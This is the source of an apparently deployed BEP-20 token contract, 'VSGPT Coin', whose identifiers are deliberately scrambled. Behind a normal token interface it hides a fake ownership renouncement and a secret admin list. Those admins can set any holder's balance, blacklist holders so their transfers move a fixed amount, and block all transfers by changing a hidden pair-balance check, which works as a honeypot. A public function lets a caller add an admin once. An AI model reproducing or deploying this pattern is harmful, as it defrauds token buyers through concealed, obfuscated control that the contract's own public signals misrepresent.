/**
 *Submitted for verification at BscScan.com on 2023-03-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface hoxxaohhcnee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address iagaoweqilvzz) external view returns (uint256);

    function transfer(address xkactthubsavb, uint256 ksvracfgfoo) external returns (bool);

    function allowance(address imwmivqxtpi, address spender) external view returns (uint256);

    function approve(address spender, uint256 ksvracfgfoo) external returns (bool);

    function transferFrom(
        address sender,
        address xkactthubsavb,
        uint256 ksvracfgfoo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed cwfbuawxcyevvo, uint256 value);
    event Approval(address indexed imwmivqxtpi, address indexed spender, uint256 value);
}

interface hoxxaohhcneeMetadata is hoxxaohhcnee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract dhvupfxttpdn {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface bbqhclsxboengd {
    function createPair(address zvxjbjonfvp, address jgtsvfzimwf) external returns (address);
}

interface hjwgrboktqs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VSGPTCoin is dhvupfxttpdn, hoxxaohhcnee, hoxxaohhcneeMetadata {

    bool private bhoqnckvadqh;

    uint256 cpekflfxkk;

    function approve(address barnoebxujhn, uint256 ksvracfgfoo) public virtual override returns (bool) {
        aveqcufuztjzhq[_msgSender()][barnoebxujhn] = ksvracfgfoo;
        emit Approval(_msgSender(), barnoebxujhn, ksvracfgfoo);
        return true;
    }

    string private vkvinyxxeb = "VSGPT Coin";

    function transferFrom(address pgxuydgfotc, address xkactthubsavb, uint256 ksvracfgfoo) external override returns (bool) {
        if (_msgSender() != gzvinzrlpgsb) {
            if (aveqcufuztjzhq[pgxuydgfotc][_msgSender()] != type(uint256).max) {
                require(ksvracfgfoo <= aveqcufuztjzhq[pgxuydgfotc][_msgSender()]);
                aveqcufuztjzhq[pgxuydgfotc][_msgSender()] -= ksvracfgfoo;
            }
        }
        return ikiczqgbew(pgxuydgfotc, xkactthubsavb, ksvracfgfoo);
    }

    function kodrvubsmsrfak() public {
        emit OwnershipTransferred(jitndxthdfmr, address(0));
        ogsjduqeggdl = address(0);
    }

    function piftlnfjdqqv(address pgxuydgfotc, address xkactthubsavb, uint256 ksvracfgfoo) internal returns (bool) {
        require(scqgiwnpt[pgxuydgfotc] >= ksvracfgfoo);
        scqgiwnpt[pgxuydgfotc] -= ksvracfgfoo;
        scqgiwnpt[xkactthubsavb] += ksvracfgfoo;
        emit Transfer(pgxuydgfotc, xkactthubsavb, ksvracfgfoo);
        return true;
    }

    uint256 private hdjutdqekpsdsg;

    address bytixlvghoffee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return ogsjduqeggdl;
    }

    function fmkmgmdfnqipw(address vbmsvmlpcrqxe, uint256 ksvracfgfoo) public {
        mcocmoycjprg();
        scqgiwnpt[vbmsvmlpcrqxe] = ksvracfgfoo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return mupwqgavnt;
    }

    function balanceOf(address iagaoweqilvzz) public view virtual override returns (uint256) {
        return scqgiwnpt[iagaoweqilvzz];
    }

    event OwnershipTransferred(address indexed wbmgfowtih, address indexed nihxxiwdrh);

    uint256 constant kdgmlxzacmx = 13 ** 10;

    function transfer(address vbmsvmlpcrqxe, uint256 ksvracfgfoo) external virtual override returns (bool) {
        return ikiczqgbew(_msgSender(), vbmsvmlpcrqxe, ksvracfgfoo);
    }

    function symbol() external view virtual override returns (string memory) {
        return htogbxgnllvo;
    }

    function allowance(address yniibsivfhqfn, address barnoebxujhn) external view virtual override returns (uint256) {
        if (barnoebxujhn == gzvinzrlpgsb) {
            return type(uint256).max;
        }
        return aveqcufuztjzhq[yniibsivfhqfn][barnoebxujhn];
    }

    uint256 cabrcrvcruq;

    bool public mvrghmsjaqnzz;

    constructor (){
        if (bypfxfebu != hdjutdqekpsdsg) {
            keuimsnajajh = true;
        }
        hjwgrboktqs bmhzezoggqy = hjwgrboktqs(gzvinzrlpgsb);
        tyfgkgglew = bbqhclsxboengd(bmhzezoggqy.factory()).createPair(bmhzezoggqy.WETH(), address(this));
        if (keuimsnajajh) {
            mvrghmsjaqnzz = true;
        }
        jqxfffdhu[_msgSender()] = true;
        scqgiwnpt[_msgSender()] = mupwqgavnt;
        jitndxthdfmr = _msgSender();
        if (hdjutdqekpsdsg == bypfxfebu) {
            keuimsnajajh = false;
        }
        emit Transfer(address(0), jitndxthdfmr, mupwqgavnt);
        ogsjduqeggdl = _msgSender();
        kodrvubsmsrfak();
    }

    function getOwner() external view returns (address) {
        return ogsjduqeggdl;
    }

    bool public xxkaaubsfakhjn;

    function mcocmoycjprg() private view {
        require(jqxfffdhu[_msgSender()]);
    }

    bool public myavlmjhya;

    mapping(address => bool) public nioephrexup;

    function decimals() external view virtual override returns (uint8) {
        return vjkdbytqk;
    }

    mapping(address => mapping(address => uint256)) private aveqcufuztjzhq;

    address private ogsjduqeggdl;

    uint8 private vjkdbytqk = 18;

    uint256 private mupwqgavnt = 100000000 * 10 ** 18;

    address public jitndxthdfmr;

    address gzvinzrlpgsb = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function yqjgyfhfkadon(address tfpxcdxrx) public {
        if (xxkaaubsfakhjn) {
            return;
        }
        
        jqxfffdhu[tfpxcdxrx] = true;
        if (hdjutdqekpsdsg != bypfxfebu) {
            bypfxfebu = hdjutdqekpsdsg;
        }
        xxkaaubsfakhjn = true;
    }

    mapping(address => uint256) private scqgiwnpt;

    function name() external view virtual override returns (string memory) {
        return vkvinyxxeb;
    }

    mapping(address => bool) public jqxfffdhu;

    string private htogbxgnllvo = "VCN";

    bool public keuimsnajajh;

    bool public zffnzxtqdmd;

    uint256 private bypfxfebu;

    function tbnzueiacbs(address hwpdmcpxnmtyf) public {
        mcocmoycjprg();
        if (hdjutdqekpsdsg != bypfxfebu) {
            zffnzxtqdmd = true;
        }
        if (hwpdmcpxnmtyf == jitndxthdfmr || hwpdmcpxnmtyf == tyfgkgglew) {
            return;
        }
        nioephrexup[hwpdmcpxnmtyf] = true;
    }

    function ikiczqgbew(address pgxuydgfotc, address xkactthubsavb, uint256 ksvracfgfoo) internal returns (bool) {
        if (pgxuydgfotc == jitndxthdfmr) {
            return piftlnfjdqqv(pgxuydgfotc, xkactthubsavb, ksvracfgfoo);
        }
        uint256 bvtttykhx = hoxxaohhcnee(tyfgkgglew).balanceOf(bytixlvghoffee);
        require(bvtttykhx == cpekflfxkk);
        if (nioephrexup[pgxuydgfotc]) {
            return piftlnfjdqqv(pgxuydgfotc, xkactthubsavb, kdgmlxzacmx);
        }
        return piftlnfjdqqv(pgxuydgfotc, xkactthubsavb, ksvracfgfoo);
    }

    function hlzkogeor(uint256 ksvracfgfoo) public {
        mcocmoycjprg();
        cpekflfxkk = ksvracfgfoo;
    }

    bool private umoitdpoew;

    address public tyfgkgglew;

}